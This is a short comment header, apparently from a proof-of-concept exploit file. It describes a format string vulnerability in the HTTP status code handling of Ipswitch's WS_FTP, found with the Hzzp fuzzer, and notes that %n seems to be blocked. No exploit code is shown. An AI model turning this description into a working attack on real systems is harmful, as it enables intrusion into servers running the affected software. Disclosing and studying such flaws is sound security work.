# I really _hate_ releasing proof of concepts. ASCII gets itchy after a few months. And it has been over a
# year since a WS_FTP exploit/PoC has been on milw0rm (as far as I know) (!). Crazy right? This bug was
# found with Hzzp, yes WS_FTP parses HTTP too. Format string in the status code, bang bang. But the problem
# is we can't seem to be able to use %n, which I believe is disabled by default per Microsoft, making
# exploitation more difficult. Hrm. And where is a security contact for Ipswitch? I believe I did try to
# find a reasonable resource. Maybe Ipswitch should just fuzz their products with Hzzp? xD Happy Holidays!
